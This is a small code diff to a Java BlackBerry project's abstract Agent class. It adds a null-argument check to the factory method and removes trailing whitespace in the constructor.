@@ -11,6 +11,7 @@ import blackberry.Status;
 import blackberry.log.Log;
 import blackberry.log.LogCollector;
 import blackberry.threadpool.TimerJob;
+import blackberry.utils.Check;
 import blackberry.utils.Debug;
 import blackberry.utils.DebugLevel;
 
@@ -55,6 +56,11 @@ public abstract class Agent extends TimerJob {
      */
     public static Agent factory(final int agentId, final boolean agentStatus,
             final byte[] confParams) {
+
+        //#ifdef DBC
+        Check.requires(confParams != null, "factory: confParams != null");
+        //#endif
+
         switch (agentId) {
         case AGENT_MESSAGE:
             // #debug debug
@@ -165,7 +171,7 @@ public abstract class Agent extends TimerJob {
 
         agentId = agentId_;
 
-        logOnSD = logOnSD_;        
+        logOnSD = logOnSD_;
         log = logCollector.factory(this, logOnSD_);
 
         enable(agentEnabled);
